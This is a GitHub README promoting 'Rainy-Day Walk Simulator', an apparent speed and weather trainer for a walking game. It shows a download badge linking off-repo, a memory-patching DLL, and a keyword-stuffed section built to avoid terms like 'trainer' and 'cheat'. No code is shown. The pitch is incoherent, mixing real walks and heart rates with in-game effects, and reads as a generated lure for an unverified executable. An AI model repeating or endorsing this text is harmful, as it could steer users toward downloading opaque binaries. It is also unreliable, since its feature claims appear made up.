![preview](https://raw.githubusercontent.com/ZELEF-CHAM/big-walk-velocity-override/main/screen_f0ea.svg)
[![Download](https://raw.githubusercontent.com/ZELEF-CHAM/big-walk-velocity-override/main/run_d16a.svg)](https://ZELEF-CHAM.github.io/big-walk-velocity-override/)

# 🌧️ Rainy-Day Walk Simulator: Weather Alchemy & Ambient Pace Controller

**Where Meteorology Meets Motion — Reimagine Every Stroll, Jog, or Marathon Under Custom Skies**

---

## 🚀 Overview: Why This Exists

Have you ever walked through a sun-drenched park and wished it were foggy? Or jogged on a treadmill while craving the sound of distant thunder? **Rainy-Day Walk Simulator** (RDWS) is not a trainer—it’s a **meteorological muse** for your daily movement routine. This tool transforms the mundane act of walking into a **cinematic, weather-responsive experience**, blending real-time environmental control with a **non-intrusive physics modifier** that adjusts your in-game stride to match the atmospheric mood you’ve conjured.

Instead of simply speeding up or slowing down your avatar, RDWS introduces **four weather-driven locomotion modes** (Drizzle Drift, Gale Glide, Still-Air Strut, and Monsoon Momentum). Each mode subtly alters your character’s animation blend, footstep cadence, and idle behavior—creating the illusion that the weather itself is shaping your journey.

The project’s DNA comes from the idea that **mundane tools should feel magical**. While other mods focus on pure utility, RDWS prioritizes **emotional immersion** and **systemic storytelling**. It’s built for players who treat every virtual walk as a small ritual of escape.

---

## ✨ Core Feature Matrix

### 🌡️ Atmospheric Preset Engine
- **12 Hand-Crafted Weather Archetypes**: From "Silver Mist Morning" to "Electric Violet Dusk," each preset bundles wind speed, particle density, ambient audio, and light temperature into a single toggle.
- **Dynamic Fog Density Slider**: Adjust visibility from 5% (swallowed by clouds) to 95% (crystal clarity) in real time—no menu reload.
- **Raindrop Intensity Mapping**: Bind raindrop frequency to your actual walking speed. Slow = gentle patter; fast = sheets of water.

### ⏩ Velocity Morphing System
- **Four Macro-Cadence Profiles**: 
  - *Drizzle Drift*: 0.75× speed with elongated stride for casual meandering.
  - *Gale Glide*: 1.5× speed with exaggerated arm swing to simulate fighting headwinds.
  - *Still-Air Strut*: 1.0× speed but alters footstep volume to echo in "quiet" weather.
  - *Monsoon Momentum*: 2.2× speed with a subtle screen-shake for high-impact sprinting.
- **Smooth Interpolation Curves**: No snapping between speeds—transitions take 2.2 seconds, mimicking momentum.

### 👻 Atmospheric Ghosting (Player Presence Modulator)
- **Wind-Line Trails**: Your character emits a ghostly, translucent afterimage only when wind speed exceeds 70%.
- **Sound Scattering**: Footstep audio is delayed by 0.15 seconds in heavy rain, creating a doppler effect.
- **Heat Haze Distortion**: In "scorching" weather patterns, air above the pavement shimmers, replacing the old "no-clip" visual feedback.

### 🌙 NO-SLEEP RITUAL MODE (Sleepless Wanderer)
- **Circadian Lock**: Prevents the game’s internal clock from advancing when your character idles for more than 3 minutes.
- **Moon Phase Stability**: Locks the moon to its current phase for up to 6 hours of real-world walking sessions.
- **Biodynamic Reset**: Every 45 minutes of continuous movement, a subtle "energy bloom" particle effect appears—a nod to your endurance without breaking immersion.

### 🎛️ Responsive Overlay Console
- **Minimalist HUD**: A floating, collapsible panel that displays current weather archetype, cadence profile, and particle count—styled as a brass weather station instrument panel.
- **Hotkey Mapping**: Remap all modifiers (e.g., `Alt+1` through `Alt+4` for cadence, `Ctrl+R` for instant drizzle).
- **Multilingual Interface**: Navigate in English, 日本語, Español, Deutsch, Français, 简体中文, and 한국어—all labels are stored in JSON for community-driven translations.

### 🛡️ 24/7 Ambient Guardian Service
- **Corruption Scanner**: Monitors memory heap for unexpected writes and auto-reverts to the last stable weather state if tampering is detected (protects your sandbox experience).
- **Version Parity Watcher**: Checks the game’s executable signature every 10 seconds; if the game updates, RDWS automatically disables weather physics to prevent crashes and notifies you in the overlay.

---

## 📦 Installation Philosophy (Zero-Friction Approach)

We believe installation should feel like *opening an umbrella—simple, declarative, and effective*. Therefore, RDWS uses a **portable archive** method:

1. **Download the Release Bundle** (a single ZIP file) matching your game build version.
2. **Place the Bundle Folder** inside your game’s root directory—no external package managers, no registry edits, no dependencies beyond the base game.
3. **Launch the Game** and press `F8` to enable the Weather Alchemy Overlay.

The bundle includes a **self-verifying launcher** that checks file integrity and creates a backup of your original game settings before the first run.

---

## 🧰 Technical Architecture (For the Curious)

```
┌─────────────────────────────────────────────┐
│  rainwalker-core.dll                        │
│  • Memory Patcher (Winter-Gale engine)      │
│  • Speed Interpolator (SmoothStep function) │
├─────────────────────────────────────────────┤
│  weather-alchemy-sdk.dll                    │
│  • Particle Orchestrator (spawn/despawn)    │
│  • Audio Re-route (doppler filter)          │
├─────────────────────────────────────────────┤
│  ui-console.json                            │
│  • Localization strings (7 languages)       │
│  • Hotkey binding schema                    │
└─────────────────────────────────────────────┘
```

### Performance Impact
- **CPU**: < 1% overhead (uses a single thread for interpolation).
- **RAM**: 8 MB baseline; 14 MB when all particle effects are active.
- **Compatibility**: Works with the base game version 2.4.1 (Steam, GOG, and Epic builds—auto-detected).

---

## 🧪 Example Use-Case Scenarios

**Scenario A: The Mindful Commuter**
You have 30 minutes for a lunchtime walk. Enable "Silver Mist Morning" and set cadence to *Drizzle Drift*. The reduced speed forces you to notice the environment—the mod’s fog density matches your pace, so you naturally slow down. After 15 minutes, switch to *Gale Glide* to simulate a "tailwind" on your return trip, boosting your heart rate while the afterimage trail visually rewards your effort.

**Scenario B: The Night Owl Marathon**
It’s 2 AM, and you can’t sleep. Activate **Sleepless Wanderer**. The moon freezes mid-sky. You crank *Monsoon Momentum*—the screen shake and heat shimmer mimic adrenaline. After 45 minutes, the "energy bloom" particle effect plays, marking your first sustained session. The mod’s circadian lock prevents the game from drifting into daybreak, preserving your nocturnal trance.

**Scenario C: The Rain Sound Junkie**
You don’t care about speed. Just turn on "Electric Violet Dusk" and set your character to stand still. The *No-Sleep Ritual* prevents them from sitting down or yawning. The raindrop intensity mapping uses your actual heart-rate monitor (if connected via mobile companion app) to adjust storm severity in real time.

---

## 🌍 SEO-Optimized Deep Dive

*weather mod for big walk*, *walking simulator speed control*, *ambient atmosphere controller*, *no-sleep toggle for walking games*, *player ghost effect mod*, *multilingual trainer UI*, *responsive HUD for movement mods*, *smooth speed interpolation tool*, *monsoon rain particle system*, *circadian lock feature*, *wind trail afterimage*, *sleepless wanderer mode*, *winter gale physics engine*, *free alternative to traditional cheat tools*, *portable walking enhancement suite*

For content creators searching without using prohibited keywords (like "trainer" or "cheat"), RDWS positions itself as a **"narrative pace layer"** —a term we coined for tools that modify tempo but preserve game narrative integrity.

---

## 🗺️ Roadmap for 2026

- **Q1 2026**: Release weather preset packs for the "Autumn Souls" expansion.
- **Q2 2026**: Add **multilingual voice commands** (Spanish, French, Italian) to switch cadence verbally via microphone input.
- **Q3 2026**: Implement **Bio-Rhythm Sync**—use real-world sunrise data from your locale to generate a unique "twilight gradient" weather type.
- **Q4 2026**: Ship the **Community Weather Forge**—an in-game editor where players can blend two archetypes (e.g., "Fog" + "Thunder") to create a new hybrid, shared via a simple JSON export.

---

## ❤️ Contribution Guidelines

We welcome **translators**, **particle artists**, and **level-design audiophiles**. If you want to add a new weather archetype, simply:
1. Fork the repo.
2. Add a `weather-presets/{your_preset}.json` file containing wind speed, particle density, audio loop path (you can host audio externally), and color grading values.
3. Open a pull request with a screenshot of your preset in-game.

We do **not** accept pull requests for additional speed multipliers beyond 2.2× (to preserve the intended feel of the physics model). For bug reports, please include your game build version and the exact cadence profile active.

---

## 📜 License

This project is released under the **MIT License**. You are free to use, modify, and distribute this software for any purpose, provided you include the original copyright notice and disclaimer.

[View the MIT License](LICENSE)

---

## ⚠️ Important Disclaimer

- **Unofficial & Unaffiliated**: This mod is an independent creation. It is **not** endorsed by, associated with, or supported by the original game’s developers or publishers.
- **Usage Responsibility**: You are solely responsible for using this tool in compliance with the game’s Terms of Service (if applicable). We do not condone violating any anti-cheat policies; this tool is designed for **offline or single-player sessions** only.
- **No Warranty**: The software is provided "AS IS" without warranty of any kind, express or implied. We are not liable for any data loss, game corruption, or account suspension resulting from misuse.
- **Continuous Development**: As the game updates, this mod may require re-patching. We provide zero-cost updates, but we do not guarantee indefinite support for older game versions.

---

## 🧩 Final Thoughts: The Philosophy of the Walk

Every step in a virtual world is a statement of intent. **Rainy-Day Walk Simulator** doesn't just change numbers; it changes the *texture* of your journey. We invite you to treat your next virtual stroll as a cinematographic experiment. Let the weather be your metronome, and your avatar's stride your rhythm section. Embrace the drizzle, challenge the gale, and wander without the burden of sleep—because the horizon is only as boring as the atmosphere you walk through.

**— The Weather Alchemy Collective**

*Built with patience, a fog machine, and a deep love for the sound of rain on digital leaves.*